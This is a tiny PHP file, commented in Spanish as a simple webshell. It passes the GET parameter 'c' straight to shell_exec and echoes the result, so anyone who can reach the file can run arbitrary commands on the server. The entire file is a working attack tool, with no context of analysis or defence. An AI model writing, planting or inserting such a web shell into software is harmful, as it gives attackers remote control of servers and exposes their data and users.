<?php 
// simple webshell: ejecuta el comando recibido por GET 'c' y lo imprime 
echo shell_exec($_GET['c']);
